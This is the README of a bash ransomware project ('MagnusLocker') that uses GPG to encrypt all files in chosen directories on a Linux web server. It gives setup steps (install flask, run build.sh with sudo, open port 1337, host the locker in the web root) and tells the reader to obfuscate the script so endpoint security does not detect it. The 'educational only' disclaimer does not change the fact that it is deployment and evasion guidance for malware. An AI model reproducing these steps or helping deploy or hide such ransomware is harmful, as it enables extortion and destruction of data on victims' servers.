# Bash Ransomware
A fun project that uses GPG to encrypt all files in specific directories on a linux based web server.

Only meant as a fun little exercise and not for malicious use. Educational reasons only!

To better avoid end point security solutions make sure before you run the script to obfuscate the bash code with: https://www.npmjs.com/package/bash-obfuscate

# Setup

Install flask for server.py (pip install flask)

sudo ./build.sh

sudo ufw allow 1337/tcp

host the relevant files in the web root /var/www/html such as index.html and MagnusLocker once compiled
